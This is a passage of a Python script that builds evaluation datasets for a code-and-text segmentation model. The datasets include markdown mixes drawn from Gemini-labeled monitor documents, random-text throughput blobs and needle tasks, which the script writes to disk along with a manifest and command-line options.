                append_markdown_text(outro_text, outro_frag, outro_synth, "outro_text", suffix=tail)

            if rng.random() < 0.3:
                append_part("text", "```")

            if not any(seg["label"] != "text" for seg in segments):
                continue

            content = "".join(content_chunks)
            host_display_token = host_block_meta["display_label"] if host_block_meta else ""
            host_display_language = host_block_meta["display_language"] if host_block_meta else ""
            other_display_token = other_block_meta["display_label"] if other_block_meta else ""
            other_display_language = other_block_meta["display_language"] if other_block_meta else ""

            meta = {
                "host_lang": lang,
                "host_uid": host.uid,
                "other_lang": other_lang,
                "other_uid": other.uid,
                "wrapped_host": bool(host_block_meta.get("wrapped") if host_block_meta else wrap_host),
                "wrapped_other": bool(other_block_meta.get("wrapped") if other_block_meta else wrap_other),
                "host_fence_label": host_display_token,
                "host_fence_language": host_display_language,
                "host_fence_mismatch": bool(host_block_meta.get("mismatched") if host_block_meta else False),
                "other_fence_label": other_display_token,
                "other_fence_language": other_display_language,
                "other_fence_mismatch": bool(other_block_meta.get("mismatched") if other_block_meta else False),
                "markdown_blocks": markdown_blocks,
                "inline_blocks": inline_blocks,
            }
            examples.append(
                _make_record(task, lang, idx, content, segments, langs_seen, meta)
            )

    return task, examples, desc


def _build_markdown_dataset_from_monitor(
    monitor_docs: Sequence[MonitorDoc],
    per_label: int,
    rng: random.Random,
) -> Tuple[str, List[dict], str]:
    """Build markdown_mix task from real Gemini-labeled markdown monitor docs."""

    task = "markdown_mix"
    desc = "Monitor markdown documents with natural code/text interleavings."
    examples: List[dict] = []
    _log("📝 Building markdown mix dataset from monitor set...")

    # Only consider documents whose declared type is markdown.
    markdown_docs = [doc for doc in monitor_docs if doc.declared_lang == "markdown"]
    if not markdown_docs:
        _log("⚠️  No monitor markdown documents found; skipping markdown_mix.")
        return task, examples, desc

    rng.shuffle(markdown_docs)
    max_examples = len(markdown_docs)
    if per_label > 0:
        max_examples = min(max_examples, per_label)

    for idx, doc in enumerate(markdown_docs[:max_examples]):
        if not doc.segments:
            continue

        # Require at least one non-text/code segment inside the markdown host.
        nontext_segments = [
            seg
            for seg in doc.segments
            if str(seg.get("label", "")) not in {"text", "markdown"}
        ]
        if not nontext_segments:
            continue

        # Rebuild segments, mapping markdown text to the "text" label so that
        # evaluation uses the same conventions as the synthetic markdown dataset.
        segments: List[dict] = []
        for seg in doc.segments:
            label = str(seg.get("label", ""))
            start = int(seg.get("char_start", 0))
            end = int(seg.get("char_end", start))
            if end <= start:
                continue
            mapped_label = "text" if label == "markdown" else label
            segments.append(_segment(mapped_label, start, end))
        if not segments:
            continue

        langs = sorted({seg["label"] for seg in segments if seg.get("label")})

        # Treat each non-text segment as a markdown code "block".
        markdown_blocks: List[dict] = []
        for seg in nontext_segments:
            start = int(seg.get("char_start", 0))
            end = int(seg.get("char_end", start))
            if end <= start:
                continue
            lang = str(seg.get("label", ""))
            markdown_blocks.append(
                {
                    "role": "other",
                    "wrapped": False,
                    "language": lang,
                    "display_label": "",
                    "display_language": "",
                    "mismatched": False,
                    "char_start": start,
                    "char_end": end,
                    "source_uid": doc.uid,
                    "wrapper": "plain",
                    "closed": True,
                }
            )

        meta = {
            "markdown_blocks": markdown_blocks,
            "inline_blocks": [],
            "monitor_source": doc.source,
        }
        examples.append(
            _make_record(
                task,
                "markdown",
                idx,
                doc.content,
                segments,
                langs,
                meta,
            )
        )

    return task, examples, desc


def _assemble_label_block(
    fragments: List[Fragment],
    target_bytes: int,
    rng: random.Random,
) -> Tuple[str, int]:
    parts: List[str] = []
    total = 0
    attempt = 0
    while total < target_bytes and attempt < target_bytes * 4:
        frag = rng.choice(fragments)
        snippet = frag.content.strip()
        if not snippet:
            attempt += 1
            continue
        if parts:
            snippet = "\n" + snippet
        parts.append(snippet)
        total = len("".join(parts).encode("utf-8", "ignore"))
        attempt += 1
    combined = "".join(parts)
    data = combined.encode("utf-8", "ignore")
    if not data:
        return "", 0
    if len(data) > target_bytes:
        data = data[:target_bytes]
        combined = data.decode("utf-8", "ignore")
    return _normalize_text(combined), len(data)


def _build_throughput_dataset(
    size_bytes: int,
    num_examples: int,
    rng: random.Random,
) -> Tuple[str, List[dict], str]:
    task = f"throughput_{size_bytes}"
    pretty = {
        1024: "1 KiB",
        10_240: "10 KiB",
        102_400: "100 KiB",
        1_048_576: "1 MiB",
    }.get(size_bytes, f"{size_bytes} bytes")
    desc = f"Synthetic random text blobs for throughput ({pretty})."
    alphabet = string.ascii_letters + string.digits + string.punctuation + "\n "
    examples: List[dict] = []
    sample_count = max(1, num_examples)
    _log(f"🚀 Building throughput dataset for {pretty} with {sample_count} random samples...")
    for idx in range(sample_count):
        chars = [rng.choice(alphabet) for _ in range(size_bytes)]
        raw_content = "".join(chars)
        content = _normalize_text(raw_content)
        actual_bytes = len(content.encode("utf-8", "ignore"))
        meta = {
            "target_bytes": size_bytes,
            "actual_bytes": actual_bytes,
            "mode": "synthetic_random",
        }
        segments = [_segment("text", 0, len(content))]
        examples.append(
            _make_record(
                task,
                "synthetic",
                idx,
                content,
                segments,
                ["text"],
                meta,
            )
        )
    return task, examples, desc


def _write_dataset(
    root: Path,
    task: str,
    examples: List[dict],
    features: Features,
    overwrite: bool,
) -> int:
    if not examples:
        _log(f"⚠️  Task '{task}' produced no examples; skipping write.")
        return 0
    out_dir = root / task
    if out_dir.exists():
        if overwrite:
            _log(f"🔄 Removing existing dataset at {out_dir}")
            shutil.rmtree(out_dir)
        else:
            raise FileExistsError(f"Dataset already exists at {out_dir}; use --overwrite to replace it.")
    ds = Dataset.from_list(examples, features=features)
    ds_size_mb = sum(sys.getsizeof(ex) for ex in examples) / (1024 * 1024)
    _log(f"💾 Writing {len(ds):,} examples ({ds_size_mb:.1f} MB) to {out_dir}")
    ds.save_to_disk(str(out_dir))
    return len(ds)


def build_all_datasets(args) -> dict:
    # data_root_orig is where Arrow monitor outputs live (downloader/arrow_out
    # by default). We may override data_root for fine-tuned memmap-based
    # builds, but fine-tuned evaluation should stay strictly on the
    # monitor_preprocessed_b subset.
    data_root_orig = Path(args.data_root).resolve()
    data_root = data_root_orig
    output_root = Path(args.output_root).resolve()
    output_root.mkdir(parents=True, exist_ok=True)

    # Decide how to source monitor data:
    #  - default: Gemini segmentations + Arrow monitor
    #  - fine-tuned: use the preprocessed monitor memmap split (B) so that
    #    evaluation examples come only from the held-out subset.
    monitor_seg_root = Path(args.monitor_seg_root).resolve()
    if getattr(args, "fine_tuned", False):
        memmap_root = (REPO_ROOT / "downloader" / "monitor_preprocessed_b").resolve()
        _log(f"📥 Fine-tuned mode: loading monitor memmap from {memmap_root} ...")
        # For fine-tuned evaluation, all monitor-derived tasks (including
        # markdown_mix) are built strictly from the monitor_preprocessed_b
        # memmap subset.
        fragments_by_lang, monitor_docs = _load_monitor_fragments_and_docs_from_memmap(
            memmap_root,
            args.per_label,
            extra_multiplier=args.extra_pool_multiplier,
            seed=args.seed,
        )
        # For memmap-based builds, treat the memmap root as the conceptual
        # data source in the manifest for clarity.
        data_root = memmap_root
    else:
        fragments_by_lang, monitor_docs = _load_monitor_fragments_and_docs(
            data_root_orig,
            args.per_label,
            extra_multiplier=args.extra_pool_multiplier,
            seed=args.seed,
            monitor_seg_root=monitor_seg_root,
        )
    monitor_docs_for_needles = monitor_docs
    markdown_docs = monitor_docs

    if not fragments_by_lang and not monitor_docs_for_needles:
        raise RuntimeError("No monitor data available – cannot build evaluation datasets.")

    rng = random.Random(args.seed)
    features = _features_schema()
    manifest_tasks = []

    _log("🔧 Building evaluation datasets...")
    builders = []
    _log("📊 Building pure fragments dataset...")
    builders.append(_build_pure_dataset(fragments_by_lang, args.per_label))

    buckets = [
        ("4_15", 4, 15),
        ("16_31", 16, 31),
        ("32_63", 32, 63),
        ("64_plus", 64, None),
    ]
    for name, lo, hi in buckets:
        builders.append(
            _build_monitor_needle_dataset(
                monitor_docs_for_needles,
                args.per_label,
                name,
                lo,
                hi,
                rng,
            )
        )

    builders.append(_build_malicious_dataset(fragments_by_lang, args.per_label, rng))
    builders.append(_build_pair_dataset(fragments_by_lang, args.per_label, rng))
    builders.append(_build_triplet_dataset(fragments_by_lang, args.per_label, rng))
    builders.append(_build_markdown_dataset_from_monitor(markdown_docs, args.per_label, rng))

    for size in (1024, 10_240, 102_400, 1_048_576):
        builders.append(
            _build_throughput_dataset(size, args.throughput_examples, rng)
        )

    total_examples = 0
    _log("\n� Writing datasets to disk...")
    for task, examples, desc in tqdm(builders, desc="Writing datasets", unit="dataset"):
        count = _write_dataset(output_root, task, examples, features, overwrite=args.overwrite)
        total_examples += count
        manifest_tasks.append({
            "task": task,
            "description": desc,
            "count": count,
            "path": str((output_root / task).relative_to(output_root)),
        })
    _log(f"\n📊 Summary: Generated {len(manifest_tasks)} datasets with {total_examples:,} total examples")

    manifest = {
        "generated_at": time.strftime("%Y-%m-%dT%H:%M:%S"),
        "data_root": str(data_root),
        "output_root": str(output_root),
        "seed": args.seed,
        "per_label": args.per_label,
        "throughput_examples": args.throughput_examples,
        "tasks": manifest_tasks,
    }

    with open(output_root / "manifest.json", "w", encoding="utf-8") as f:
        json.dump(manifest, f, indent=2, sort_keys=True)

    return manifest


def parse_args(argv: Optional[Sequence[str]] = None):
    parser = argparse.ArgumentParser(
        description="Generate evaluation datasets from the monitor set (Gemini segmentations + Arrow monitor)."
    )
    parser.add_argument(
        "--data-root",
        type=str,
        default=str(REPO_ROOT / "downloader" / "arrow_out"),
        help="Path to downloader outputs (expects monitor/<lang>/dataset directories).",
    )
    parser.add_argument(
        "--monitor-seg-root",
        type=str,
        default=str(REPO_ROOT / "gemini_segmentations" / "monitor"),
        help="Path to Gemini monitor segmentations (gemini_segmentations/monitor).",
    )
    parser.add_argument(
        "--output-root",
        type=str,
        default=str(REPO_ROOT / "evaluation" / "data"),
        help="Directory where evaluation datasets will be written.",
    )
    parser.add_argument(
        "--per-label",
        type=int,
        default=100,
        help="Examples per label for most benchmarks (pure, injection, sequences, markdown).",
    )
    parser.add_argument(
        "--throughput-examples",
        type=int,
        default=4,
        help="Number of synthetic samples to create for each throughput size.",
    )
    parser.add_argument(
        "--extra-pool-multiplier",
        type=int,
        default=3,
        help="Multiplier to expand the initial monitor fragment pool per label.",
    )
    parser.add_argument("--seed", type=int, default=13)
    parser.add_argument("--overwrite", action="store_true", help="Replace existing datasets in the output directory.")
    parser.add_argument(
        "--fine-tuned",
        action="store_true",
        default=False,
        help=(
            "When set, build evaluation datasets exclusively from the "
            "monitor_preprocessed_b memmap split so that no samples from "
            "monitor_preprocessed_a are included."
        ),
    )
    return parser.parse_args(argv)


def main(argv: Optional[Sequence[str]] = None) -> None:
    args = parse_args(argv)
    manifest = build_all_datasets(args)
    _log(f"✅ Generated {len(manifest['tasks'])} datasets under {manifest['output_root']}")


if __name__ == "__main__":
    main()
